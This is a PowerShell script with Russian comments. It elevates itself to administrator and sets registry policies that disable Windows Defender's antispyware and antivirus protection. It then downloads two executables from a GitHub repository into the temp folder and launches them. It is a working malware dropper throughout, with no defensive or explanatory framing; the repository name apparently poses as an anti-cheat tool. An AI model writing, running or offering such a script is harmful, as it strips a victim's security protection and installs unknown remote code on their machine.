Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# Disable Windows Defender
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force

New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiSpyware" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiVirus" -Value "1" -PropertyType Dword -Force

Write-Host "Windows Defender DISABLED" -ForegroundColor Green

# Download and run files
$temp = $env:TEMP
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

# ИЗМЕНИ ЭТИ ИМЕНА НА ТО, ЧТО РЕАЛЬНО ЛЕЖИТ В ТВОЁМ РЕПОЗИТОРИИ
$file1 = "proga1.exe"
$file2 = "proga2.exe"   # <--- ЕСЛИ ЭТОГО ФАЙЛА НЕТ, ЗАМЕНИ НА ПРАВИЛЬНОЕ ИМЯ
# ================================================

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/$file1"
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/$file2"

$dest1 = "$temp\proga1.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "Downloading $file1..." -ForegroundColor Yellow
try {
    $wc.DownloadFile($url1, $dest1)
    Start-Process $dest1
    Write-Host "Started $file1" -ForegroundColor Green
} catch { Write-Host "FAILED $file1" -ForegroundColor Red }

Write-Host "Downloading $file2..." -ForegroundColor Yellow
try {
    $wc.DownloadFile($url2, $dest2)
    Start-Process $dest2
    Write-Host "Started $file2" -ForegroundColor Green
} catch { 
    Write-Host "FAILED $file2 - trying same as file1" -ForegroundColor Yellow
    $wc.DownloadFile($url1, $dest2)
    Start-Process $dest2
    Write-Host "Started copy of $file1 as $file2" -ForegroundColor Green
}

Write-Host "ALL DONE" -ForegroundColor Green
Pause
